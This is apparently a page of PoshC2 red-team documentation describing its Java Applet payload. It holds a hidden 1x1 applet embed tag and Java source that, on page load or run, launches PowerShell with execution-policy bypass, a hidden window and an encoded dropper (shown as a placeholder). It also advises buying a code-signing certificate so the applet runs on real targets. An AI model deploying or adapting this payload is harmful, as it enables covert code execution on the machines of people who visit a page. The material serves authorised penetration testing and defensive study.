Mitre ATT&CK - `Powershell <https://attack.mitre.org/wiki/Technique/T1086>`_

With the latest security updates applied to Java, the only real avenue of attack using a Java Applet is if the jar is signed. PoshC2 creates a Java Applet and an accompanying html document where the Jar is embedded, however, leaves the Applet unsigned. It is highly recommended that if using this payload on a real engagement you purchase a code signing certifcate that can sign Java Applets. This Jar file can be called by either embedding as a Java Applet in a webpage or used on the command line using the following command::

	Java -Jar PoshC2.jar

Otherwise the file should be hosted on a webpage and embedded using the following HTML code::

	<applet code="JavaPS" width="1" height="1" archive="JavaPS.jar"></applet>  

The Java code to execute "powershell.exe" is as follows::

	import java.applet.*;
	import java.awt.*;
	import java.io.*;

	public class JavaPS extends Applet {

	  public static void foobar() {
	    Process a;
	    String b = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e <encoded core dropper>";
	    
	    try {
	      System.out.println("Running Java");
	      a = Runtime.getRuntime().exec(b);
	    }
	    catch(IOException e) {
	      System.out.println(e);
	      e.printStackTrace();
	    }

	  }
	  
	  public static void main(String[] args) {
	    foobar();
	  }
	  
	  public void init() {
	    foobar();
	  }
	}
